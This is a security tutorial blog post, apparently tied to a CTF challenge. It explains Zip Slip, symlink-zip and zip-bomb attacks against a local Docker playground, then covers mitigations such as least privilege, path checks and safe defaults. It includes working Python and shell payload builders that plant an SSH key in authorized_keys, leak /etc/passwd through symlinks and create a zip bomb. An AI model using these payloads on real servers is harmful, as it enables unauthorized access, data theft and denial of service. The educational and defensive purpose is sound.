---
title: Attack of the Zip
excerpt: Deep dive into zip file attacks and mitigations (with examples!).
tags: 
  - tutorial
  - web
  - ctf
  - python
  - programming
  - notes
thumbnail_src: assets/attack-of-the-zip.jpg
# tocOptions: '{"tags":["h2","h3","h4"]}'
---
<!-- TODO: revise thumbnail -->

Zip files are *everywhere* in our daily lives, seamlessly integrated into our personal, academic, and professional environments. From Java apps to Microsoft Office documents, zip files have become an indispensable tool.

But as we know from *Silicon Valley*, zip files have the potential to be dangerous.^[Relevant YouTube: [SILICON VALLEY - THE ULTIMATE HACK](https://www.youtube.com/watch?v=jnDk8BcqoR0)]

{% image "assets/its-a-zip-bomb.gif", "w-80", "Filmmakers' impression of a zip bomb." %}

In this post, we'll delve into the intriguing world of zip file attacks, exploring various methods that allow attackers to gain unauthorized read and write privileges.

{% alert "danger" %}
Disclaimer: The content provided in this blog post is intended purely for educational purposes. The author does not assume any responsibility for the potential misuse of the information presented herein. Readers are advised to exercise caution and utilize the knowledge gained responsibly and within legal boundaries.
{% endalert %}


## Play Along 🐳

TODO: link to github

I've created a Docker playground for trying out zip payloads. Feel free to build it locally and follow along.

The container hosts a C++ web application built with the Drogon web framework and the Juce audio processing library (v6.1.4) for unzipping files. This was adapted from a recent web challenge I designed for HKUST Firebird CTF 2024. In the original challenge, Juce was used for audio synthesis. But to keep things simple, I've minimised the code to only unzip files—a mere shell of its former glory.

This playground was built for demonstration and education purposes. It's rare enough to find a C++ backend, even rarer to find a backend whose sole purpose is to run Juce.

<!--
To bring everyone on the same page, here's what the application does:

1. Accepts (zip) file uploads to the `/upload` endpoint. The handler for this endpoint...
   1. Generates a random key, so that upload files don't clash.
   2. Responds to the browser with the key.
   3. Processes the uploaded file.
    ```cpp
    // Generate a random key and return it.
    auto key = randomKey();
    // 200 Success. Send key back to browser for later reference.
    callback(/* ... */);

    // Now save the file...
    auto score = fileUpload.getFiles()[0];
    auto scorePath = "/app/uploads/" + key + "/score.mscz";
    score.saveAs(scorePath);

    // ...and process it.
    processScore(scorePath);
    ```
2. Exposes an endpoint at `/info?id={key}` which grabs output stored in `/app/uploads/{key}/out.txt`.

    ```cpp
    auto file = "/app/uploads/" + key + "/out.txt";
    if (checkFileExists(file.c_str())) {
        // 200 Success. Return file contents.
    } else {
        // 404 Error. No such file.
    }
    ```
-->

## Zip Attacks

### Zip Slip ⛸

#### Overview of Zip Slip

{# {% image "assets/anya-point.jpg", "w-50 floatr1-md", "Directory traversal for ../../app/flag.txt, as demonstrated by Anya." %} #}

**Zip Slip** is a fancy name for [directory traversal](https://cwe.mitre.org/data/definitions/22.html) but applied to zip uploads. The idea is to *escape* a directory by visiting parent directories using `../` (or `..\\` on Windows). This allows unauthorised access to files and directories by exploiting the lack of *proper input validation* in file path parameters.

A typical zip file may look like this:

```text
foo.zip
└── data1.csv
└── data2.txt
└── ...
```

But in a Zip Slip payload, files are prefixed with nasty double-dots (`../`).

```text
evil-slip.zip
└── ../../root/.ssh/authorized_keys
```

If a vulnerable application unzips `evil-slip.zip` to `/app/uploads/`, then our unzipped file would end up in `/app/uploads/../../root/.ssh/authorized_keys`, i.e. `/root/.ssh/authorized_keys`.

{% alert "fact" %}
Overwriting `~/.ssh/authorized_keys` is a common attack vector which can be applied in other file upload scenarios too! The flow goes like so:

1. Generate a public/private SSH key (`ssh-keygen`).
2. Exploit any file write trickery to write our public key to `~/.ssh/authorized_keys` (on the victim).
3. SSH to the victim.[^ssh]
4. Profit! Run arbitrary commands.

[^ssh]: But for this to work, the container needs to be running `sshd` (or some program which handles SSH connections) and port 22 needs to be exposed.

But this isn't the only way to gain arbitrary code execution! There are other potential targets for an arbitrary file write (server credentials, config files, etc.).
{% endalert %}

#### DIY: Build your own Zip Slip payload!

{% details "With Python", "open" %}
The easiest way is to use Python's `zipfile` module:

```python
import zipfile

with zipfile.ZipFile("evil-slip.zip", "w") as zip:
    zip.write("my-key.pub", "../.ssh/authorized_keys")
```

This creates a new `evil-slip.zip` zip file, which contains the *contents* of our previously generated `my-key.pub`, and it's stored as `../.ssh/authorized_keys`.

`zipfile` constructs the file in memory without creating temporary files. This removes the need to clean up temporary files.

{% enddetails %}

{% details "With Shell Commands" %}
Another approach is to use shell commands and reverse the process: starting with files we want unzipped.

```shell
$ touch ../.ssh/authorized_keys
# Normally we would run `ssh-keygen` to generate a key pair...
# and use the generated public key as our authorized_keys.
# But I'll assume ../.ssh/authorized_keys holds a public key.

$ zip evil-slip ../.ssh/authorized_keys
  adding: ../.ssh/authorized_keys (deflated 18%)
  
$ unzip -l evil-slip
Archive:  evil-slip.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      575  01-23-2024 17:53   ../.ssh/authorized_keys
---------                     -------
      575                     1 file
```

{% enddetails %}

#### Limitations of Zip Slip

- On Windows, you may need backslashes `\` instead of forward slashes `/`. This ultimately depends on the unzipping application/library.
- The app needs execute permissions on intermediate folders (to traverse across) and write permissions on the target folder.
  For instance, to write to `foo/bar/baz/flag.txt`, we need `x` permissions on `foo/` and `foo/bar/`; and `wx` permissions on `foo/bar/baz/`.


### Zip Symlink Attacks 🖇

There are several ways to build a malicious zip containing symlinks. But before we continue, let's first clarify two types of symlinks in our arsenal:

1. Symlink Files. This allows us to potentially *read* arbitrary files.[^root]
2. Symlink Directories. This allows us to potentially *write files* to arbitrary folders.[^root]

[^root]: Assuming we run as `root`, or as long as permissions don't get in the way.


#### Arbitrary Read with File Symlinks

{% alert "info" %}
In this subsection, "Arbitrary Read" assumes the user has some way of accessing files on the system. For instance, perhaps the system hosts a web server which serves files from a particular directory.
{% endalert %}

Let's start with a simple example of a zip symlink payload. Here's a zip which contains a symlink to `/etc/passwd`.

```text
evil-link-file.zip
└── passwd.txt         -> /etc/passwd
```

After uploading the zip and letting the app unzip it, the filesystem now resembles:

```text
app/
└── uploads/
    └── passwd.txt     -> /etc/passwd
```

If we can read files in `/app/uploads/`, then we can read `passwd.txt` and by extension, `/etc/passwd`.[^really-by-extension] Then GG! We can use this method to read any file on the system (subject to certain constraints to be discussed later).

[^really-by-extension]: Okay, I skipped some steps here, but didn't want to overcomplicate things. The long answer is: reading a symlink also depends on permissions of the {% abbr "source file", "the file linked by the symlink" %} and the {% abbr "source directory", "the directory containing the source file" %}. ***If*** we can read files in our upload directory **and** if we have sufficient permissions, then we can (potentially) have arbitrary read.

But... what if we *don't* have read access to `/app/uploads/`?

This is the case in our Docker playground. We can't access `/app/uploads/` from the browser... But! We can access files in `/app/static/`. This is the folder where static files (.html, .css, .js) are served from.

We would need to write our symlink to *that* folder first before reading it. One way is to use Zip Slip. But what if the application blocks zip files containing `../`? Is there an alternative way?


#### Arbitrary Write with Dir Symlinks

This is where things get fun. Let's slightly modify our zip by inserting a little indirection:

```text
evil-link-dir-file.zip
└── dirlink/           -> /app/static/
    └── passwd.txt     -> /etc/passwd
```

Now our zip contains a symlink directory! When unzipped, the vulnerable application will first create a symlink to `/app/static/`. Then inside that symlink, it creates *another* symlink, this time to `/etc/passwd`.

Let's see what the filesystem looks like now.

```text
app/
└── uploads/
    └── dirlink        -> /app/static/
└── static/
    └── passwd.txt     -> /etc/passwd
```

Now we can browse `https://localhost:8080/passwd.txt` to leak the contents of `/etc/passwd`.

This method can also be used to apply the same attack technique we tried in the Zip Slip section.


#### DIY: Build your own Zip Symlink Payload!

{% details "With Python", "open" %}
Like before, we can use Python to generate zip symlink payloads. We'll need some extra massaging with `ZipInfo` though.

```python
# evil-link-file.zip
# └── passwd.txt         -> /etc/passwd
with zipfile.ZipFile("evil-link-file.zip", "w", compression=zipfile.ZIP_DEFLATED) as zip:
  info = zipfile.ZipInfo("passwd.txt")
  info.create_system = 0 # Linux => 0. Windows => 3.
  info.external_attr = (stat.S_IFLNK | 0o777) << 16 # File attributes.
  zip.writestr(info, "/etc/passwd")
```

For a double symlink attack, we just create another entry for the directory.

```diff-python
 # evil-link-dir-file.zip
 # └── dirlink/           -> /app/static/
 #     └── passwd.html    -> /etc/passwd
 with zipfile.ZipFile("evil-link-dir-file.zip", "w", compression=zipfile.ZIP_DEFLATED) as zip:
   # Order matters! Write dir first, then file.
+  info = zipfile.ZipInfo("dirlink")
+  info.create_system = 0
+  info.external_attr = (stat.S_IFLNK | 0o777) << 16
+  zip.writestr(info, "/app/static/")

   info = zipfile.ZipInfo("dirlink/passwd.txt") # Also change the filename here.
   info.create_system = 0
   info.external_attr = (stat.S_IFLNK | 0o777) << 16
   zip.writestr(info, "/etc/passwd")
```

{% enddetails %}

{% details "With Shell Commands" %}
Shell commands also work. (Make sure to use `-y`/`--symlinks` when zipping symlinks. Otherwise, you'd be adding your actual `/etc/passwd`!)

```sh
# Create our (soft) links.
ln -s /app/static/ dirlink
ln -s /etc/passwd dirlink/passwd.txt
# Zip the links.
zip -y evil-link-dir-file dirlink dirlink/passwd.txt
```

Note that this approach will leave leftover files to be cleaned up (or reused).
{% enddetails %}

#### Limitations of Zip Symlink Attacks

- Permissions on Linux.
  - To create a symlink, we need execute permissions in the source directory (where the linked file is located) and write/execute permissions in the target directory (where the symlink is created).[^ref-linuxlinkperm]
  - Reading a symlink requires execute permissions in the source directory, and read permissions on the source file.
- Permissions on Windows. By default, only Administrators have the privilege to [create symbolic links](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/create-symbolic-links). This setting can be changed by [editing the local group policy](https://superuser.com/a/105381) or by directly enabling `SeCreateSymbolicLinkPrivilege`.

[^ref-linuxlinkperm]: Reference: [SO: Minimum Permissions Required to Create a Link to a File](https://stackoverflow.com/questions/40667014/linux-what-are-the-minimum-permissions-required-to-create-a-link-to-a-file)


### Zip Bombs 💣

Since we're talking about attacks, let's also cover zip bombs for completeness.

<!-- > Gavin: The f*** is happening?  
> Mark: Oh 💩, looks like a zip bomb, they must know it's us!  
> Bob: That hard drive if f****d.  
> Gavin: This is my personal laptop-  
> Brian: You opened a *stolen beta* on your *personal* computer?  
> Gavin: Yes. And installed it on my phone.  
>   — [Silicon Valley S3E7](https://www.youtube.com/watch?v=jnDk8BcqoR0) -->

Zip bombs are designed to cripple computers, systems, and virus scanners (rather than read sensitive data or escalate privileges, like Zip Slip and symlink attacks). Much like the well-memed [fork bomb](https://en.wikipedia.org/wiki/Fork_bomb), a zip bomb attempts to drain system resources.

{% images "h-auto" %}
{% image "https://i.redd.it/68j4sr9h3dg21.jpg" %}
{% image "https://img.devrant.com/devrant/rant/r_674011_CfdZB.jpg" %}
{% image "assets/unzip42.jpg" %}
{% endimages %}

<sup>Some fork bomb memes. And zip bomb memes adapted from fork bomb memes. Zip bomb memes where?^[There probably aren't as many memes on zip bombs as they tend to be a software bug which can be swiftly patched.]</sup>
{.caption}

The basic principle abuses the ***deflate***[^deflate] compression format to achieve compression ratios of up to [1032:1](https://stackoverflow.com/a/16794960/10239789). This means after compression, every byte of compressed data can represent *up to* 1032 bytes of uncompressed data.

Zip bombs approach this ratio by compressing a file with highly-repetitive patterns (e.g. all zeros) which can be counted and grouped compactly.

{% details "Why are highly-repetitive patterns 'easier to compress'?" %}
To see why repetitive patterns facilitate compression, consider an analogy with run-length encoding. If I want to compress `1111222233334444`, I might say `four 1s, four 2s, four 3s, four 4s` which has a compression ratio of 12 characters to 8 words. But if I want to compress `1111111111111111`, I can just say `twelve 1s`, which has a higher compression ratio of 12 characters to *2* words.
{% enddetails %}

[^deflate]: This is the same compression algorithm used in gzip (commonly used for transferring files across the web) and PNGs.

The well-known [42.zip](https://www.unforgettable.dk/) bomb is only 42KB, but contains 5 layers of zips upon zips. Unzipping the first layer yields a harmless 0.6MB. But recursively uncompressed, it yields an astronomical payload of {% abbr "4.5PB (petabytes, 15 zeros)", "4,503,599,626,321,920 bytes, to be exact" %}!

Most decompression tools and virus scanners are wary of zip bombs, and only unzip the first (few) layers or stop after identifying a zip file.
 
In 2019, David Fifield introduced *a better zip bomb*, which abuses the structure of a .zip, toying with metadata to trick decompressors into puking ungodly amounts of data.[^fifield] A compressed Fifield zip bomb of 42KB yields 5.4GB of uncompressed bytes. This metadata trickery is more generally known as **Metadata Spoofing**.

[^fifield]: The technical article by Fifield is here: *https://www.bamsoftware.com/hacks/zipbomb/*. But it may be blocked on your browser.

#### DIY: Build your own Zip Bomb!

Here's a small demo:
```sh
# Create a blank file with 5GB of null bytes.
$ dd if=/dev/zero bs=20000 count=250000 >zero.txt

# Zip it.
$ zip test.zip test.txt

# Count the number of bytes.
$ wc -c zero.txt zero.zip
 5000000000 zero.txt
 4852639 zero.zip
 5004852639 total
```

From 5GB, we've gone down to ~4.9MB! Upload a bunch of these to a vulnerable site, and boom—CPU helicopter.


## Other Zip Vulnerabilities in the Wild

Although I used Juce's [2021 symlink vulnerability](https://vulners.com/prion/PRION:CVE-2021-23521) for demonstration, zip vulnerabilities exist elsewhere too! Here are some notable ones:

- [Multiple Zip Vulnerabilities across Flutter and Swift Packages](https://blog.ostorlab.co/zip-packages-exploitation.html) (2023)
- [Zip Slip](https://www.cvedetails.com/cve/CVE-2018-1000544) (2018) and [Metadata Spoofing](https://www.cvedetails.com/cve/CVE-2019-16892/) (2019) in Rubyzip

Keep in mind zip files come in different forms. Here are some you might be familiar with:
- .docx, .pptx, .xlsx (Microsoft Documents),
- .jar (Java Archive),
- .apk (Android App),
- .mscx (MuseScore File).

Any service processing such files has potential to be vulnerable.


## Mitigations and Other Considerations

{% image "https://csis-website-prod.s3.amazonaws.com/s3fs-public/publication/171212_cyber_Defense.jpg", "w-40 floatr1", "Credit: Cybrain/Adobe Stock" %}

So much for the offensive side. How about the defensive aspect? What approaches can we take to secure our systems? Let's explore ways to mitigate zip attacks.

### Permissions
In America, "all men are created equal". Not so in filesystems.

Reading, writing, and linking files depends on permissions. Setting appropriate permissions for the process and limiting the scope of an application can go a long way in preventing attackers from snooping your secrets.

{% alert "success" %}
1. Avoid running the application as `root`. Instead, run it with a minimum privilege user. (Minimum meaning: enough permissions to get the job done, and only enabling risky permissions when needed.)^[In Docker, we can configure permissions with `chown` and [`USER`](https://docs.docker.com/engine/reference/builder/#user). (I intentionally left these out in the demo.)]
  
2. Lock down sensitive files, only allowing access to privileged users. For example, most server applications don't require write privileges to credential/config files.
{% endalert %}

Sometimes it's not entirely feasible to restrict all write permissions. For example, web servers may still need to write access logs.

See [Limitations of Zip Slip](#limitations-of-zip-slip) and [Limitations of Zip Symlink Attacks](#limitations-of-zip-symlink-attacks) for details on relevant permissions.

### Modern Antivirus

Although zip bombs have targeted antivirus (AV) systems in the past, most [modern AV programs can detect zip bombs](https://www.microsoft.com/en-us/windows/learning-center/what-is-a-zip-bomb) by recognising patterns and signatures. This brings us to our last suggestion:

{% alert "success" %}
3. Upgrade your (antivirus) software. Daily updates to malware signatures ensure your antivirus program stays equipped to detect and thwart emerging threats.
{% endalert %}

### Checks
A bonus for software developers! Research and verify your edge cases!

Here are a couple more recommendations:

{% alert "success" %}
4. Proactively consider and research edge cases and add appropriate {% abbr "branches", "if-statements, guards, exception-handling, etc." %}. Edge cases come in different forms: OS? roles? users? filenames? encodings?

5. Adopt unit testing to verify your code works as intended. Add test cases against unintended situations.

    Test cases prevent [software regression](https://en.wikipedia.org/wiki/Software_regression) and automate the menial task of manual input.

{% endalert %}

For example, Juce v6.1.5 introduced several fixes:

- They [added a check](https://github.com/juce-framework/JUCE/commit/2e874e80cba0152201aff6a4d0dc407997d10a7f#diff-16f78a017ef48e7154eac2ea6b3ee3d211fa508f5465db0c7f2667741ca00265R438-R440) to prevent arbitrary write attacks:

  ```cpp
  if (!fileToUnzip.isAChildOf(directoryToUnzipTo))
    // Attack attempt detected: attempted write outside of unzip directory.
    return Result::fail("...");
  ```

- They also added a [test case against Zip Slip](https://github.com/juce-framework/JUCE/commit/2e874e80cba0152201aff6a4d0dc407997d10a7f#diff-16f78a017ef48e7154eac2ea6b3ee3d211fa508f5465db0c7f2667741ca00265R700).

If you're writing an unzipping library, you should ensure your code handles `..` and symlinks to prevent Zip Slip and zip symlink attacks.^[Further, if the filename gets fed to other servers, you should also handle URL encodings of `.` (`%2e`) and `/` (`%2f`), which are a common bypass against straightforward checks.] If you're building an application targetting for end-users, you should also consider the potential uncompressed file size.


### Defaults

While we're on the topic of software development, having sensible defaults in libraries and application goes a long way.

{% alert "success" %}
6. Use defaults such as:

   - Don't follow symlink directories.^[There are other solutions as well. The `zip` binary found on Unix systems handles this by deferring linkage until *all* files have been uncompressed.]
   - Don't overwrite files. You don't want your files wiped out, right?

    It's a good idea to keep these defaults, unless you really need these features, and you're confident with the level of risk you're dealing with.

{% endalert %}


## Further Reading / References

- [PentesterAcademy](https://blog.pentesteracademy.com/from-zip-slip-to-system-takeover-8564433ea542)
- [SecurityVault](https://thesecurityvault.com/attacks-with-zip-files-and-mitigations/)